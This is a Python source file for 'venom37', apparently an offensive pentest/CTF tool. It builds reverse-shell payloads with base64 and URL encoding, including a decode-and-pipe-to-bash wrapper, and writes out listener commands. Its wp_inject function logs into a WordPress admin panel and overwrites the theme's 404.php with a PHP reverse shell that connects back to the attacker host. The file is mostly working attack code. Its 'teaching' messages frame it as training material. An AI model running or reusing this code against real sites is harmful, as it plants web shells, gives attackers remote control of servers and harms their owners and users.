"""venom37 engine — reverse shell generator."""
from __future__ import annotations

import base64
import json
import urllib.parse
from dataclasses import dataclass, asdict

from venom37.payloads import SHELLS, LISTENERS, STABILIZE_COMMANDS


@dataclass
class ShellResult:
    """Generated shell result."""
    shell_type: str
    name: str
    code: str
    listener_cmd: str
    lhost: str
    lport: int
    encoding: str | None = None
    explanation: str = ""
    stabilize: list[str] | None = None
    platform: str = ""
    requires: str = ""

    def to_json(self) -> str:
        return json.dumps(asdict(self), indent=2)

    def to_human(self) -> str:
        lines = [
            f"\n  \033[96m{'='*60}\033[0m",
            f"  \033[96mvenom37 — {self.name}\033[0m",
            f"  \033[96m{'='*60}\033[0m",
            f"  Platform: {self.platform}",
            f"  Requires: {self.requires}",
            "",
            f"  \033[93m[1] Start your listener:\033[0m",
            f"  \033[92m{self.listener_cmd}\033[0m",
            "",
            f"  \033[93m[2] Execute on target:\033[0m",
        ]
        # Handle multiline payloads
        for cl in self.code.split("\n"):
            lines.append(f"  \033[92m{cl}\033[0m")

        if self.encoding:
            lines.append(f"\n  Encoding: {self.encoding}")

        if self.stabilize:
            lines.append(f"\n  \033[93m[3] Stabilize your shell:\033[0m")
            for cmd in self.stabilize:
                lines.append(f"  \033[90m{cmd}\033[0m")

        if self.explanation:
            lines.append(f"\n  \033[93m[i] {self.explanation}\033[0m")

        lines.append("")
        return "\n".join(lines)


class Venom:
    """Reverse shell generator.

    Usage:
        shell = Venom.generate("php", lhost="10.0.0.1", lport=4444)
        print(shell.code)
        print(shell.listener_cmd)
    """

    @staticmethod
    def list_types() -> list[dict]:
        """List all available shell types."""
        return [
            {
                "type": key,
                "name": info["name"],
                "description": info["description"],
                "platform": info.get("platform", "linux"),
                "requires": info.get("requires", ""),
            }
            for key, info in SHELLS.items()
        ]

    @staticmethod
    def generate(
        shell_type: str,
        lhost: str,
        lport: int = 4444,
        encode: str | None = None,
        listener: str = "nc",
        variant: str | None = None,
    ) -> ShellResult:
        """Generate a reverse shell payload.

        Args:
            shell_type: Shell language (bash, python, php, nc, etc.)
            lhost: Attacker IP address
            lport: Attacker port (default: 4444)
            encode: Encoding (base64, url, double-url, or None)
            listener: Listener type (nc, socat, pwncat, rlwrap, msfconsole)
            variant: Use a specific variant of the shell type
        """
        if shell_type not in SHELLS:
            available = ", ".join(SHELLS.keys())
            raise ValueError(
                f"Unknown shell type: '{shell_type}'\n"
                f"  Available: {available}\n"
                f"  Use 'venom37 list' to see all options with descriptions."
            )

        info = SHELLS[shell_type]

        # Handle PowerShell Base64 special case
        if shell_type == "powershell-base64":
            ps_code = SHELLS["powershell"]["template"].format(lhost=lhost, lport=lport)
            encoded = base64.b64encode(ps_code.encode("utf-16le")).decode()
            code = f"powershell -nop -enc {encoded}"
        elif variant and "variants" in info and variant in info["variants"]:
            code = info["variants"][variant].format(lhost=lhost, lport=lport)
        else:
            code = info["template"].format(lhost=lhost, lport=lport)

        # Apply encoding
        encoding_name = None
        if encode:
            if encode == "base64":
                code = f"echo {base64.b64encode(code.encode()).decode()} | base64 -d | bash"
                encoding_name = "base64"
            elif encode == "url":
                code = urllib.parse.quote(code)
                encoding_name = "url-encoded"
            elif encode == "double-url":
                code = urllib.parse.quote(urllib.parse.quote(code))
                encoding_name = "double-url-encoded"

        # Listener command
        listener_template = LISTENERS.get(listener, LISTENERS["nc"])
        listener_cmd = listener_template.format(lhost=lhost, lport=lport)

        # Explanation
        explanation = (
            f"This {info['name']} reverse shell will connect back to {lhost}:{lport}. "
            f"{info['description']}"
        )

        return ShellResult(
            shell_type=shell_type,
            name=info["name"],
            code=code,
            listener_cmd=listener_cmd,
            lhost=lhost,
            lport=lport,
            encoding=encoding_name,
            explanation=explanation,
            stabilize=STABILIZE_COMMANDS,
            platform=info.get("platform", "linux"),
            requires=info.get("requires", ""),
        )

    @staticmethod
    async def wp_inject(
        target_url: str,
        username: str,
        password: str,
        lhost: str,
        lport: int = 4444,
        theme: str | None = None,
    ) -> dict:
        """Inject a PHP reverse shell into a WordPress theme.

        This authenticates to wp-admin, finds an editable theme file (404.php),
        and replaces it with a PHP reverse shell.

        Args:
            target_url: WordPress base URL
            username: Admin username
            password: Admin password
            lhost: Attacker IP
            lport: Attacker port
            theme: Theme name (auto-detected if not provided)
        """
        import httpx
        import re
        import sys

        base = target_url.rstrip("/")
        login_url = f"{base}/wp-login.php"
        shell = Venom.generate("php-web", lhost=lhost, lport=lport)

        async with httpx.AsyncClient(
            timeout=httpx.Timeout(15.0), verify=False, follow_redirects=True,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"},
        ) as client:
            # Login
            print("  [*] Logging into WordPress...", file=sys.stderr)
            login_data = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{base}/wp-admin/",
                "testcookie": "1",
            }
            resp = await client.post(login_url, data=login_data,
                                     cookies={"wordpress_test_cookie": "WP+Cookie+check"})

            if "dashboard" not in resp.text.lower() and "wp-admin" not in str(resp.url):
                return {"success": False, "error": "Login failed. Check credentials."}

            print("  [+] Logged in successfully.", file=sys.stderr)

            # Get theme editor page to find active theme
            if not theme:
                editor_url = f"{base}/wp-admin/theme-editor.php"
                resp = await client.get(editor_url)
                # Try to find active theme from the editor page
                match = re.search(r'theme=([a-zA-Z0-9_-]+)', resp.text)
                if match:
                    theme = match.group(1)
                else:
                    theme = "twentytwentyone"  # common default
                print(f"  [*] Using theme: {theme}", file=sys.stderr)

            # Get the 404.php file for editing
            file_url = f"{base}/wp-admin/theme-editor.php?file=404.php&theme={theme}"
            resp = await client.get(file_url)

            # Extract the nonce
            nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', resp.text)
            if not nonce_match:
                return {"success": False, "error": "Could not find editor nonce. Theme editor may be disabled."}

            nonce = nonce_match.group(1)

            # Inject the shell
            print("  [*] Injecting PHP reverse shell into 404.php...", file=sys.stderr)
            edit_data = {
                "_wpnonce": nonce,
                "_wp_http_referer": f"/wp-admin/theme-editor.php?file=404.php&theme={theme}",
                "newcontent": shell.code,
                "action": "update",
                "file": "404.php",
                "theme": theme,
                "submit": "Update File",
            }
            resp = await client.post(f"{base}/wp-admin/theme-editor.php", data=edit_data)

            if "updated" in resp.text.lower() or resp.status_code == 200:
                trigger_url = f"{base}/wp-content/themes/{theme}/404.php"
                print(f"  [+] Shell injected! Trigger: {trigger_url}", file=sys.stderr)
                return {
                    "success": True,
                    "trigger_url": trigger_url,
                    "listener_cmd": shell.listener_cmd,
                    "theme": theme,
                    "lhost": lhost,
                    "lport": lport,
                    "teaching": (
                        f"The PHP reverse shell was injected into {theme}/404.php. "
                        f"Start your listener with '{shell.listener_cmd}' then visit {trigger_url} "
                        f"to trigger the shell. WordPress theme editor is a classic privesc vector — "
                        f"if you have admin creds, you can always get code execution this way."
                    ),
                }
            else:
                return {"success": False, "error": "Failed to update theme file. Theme editor might be disabled or file not writable."}
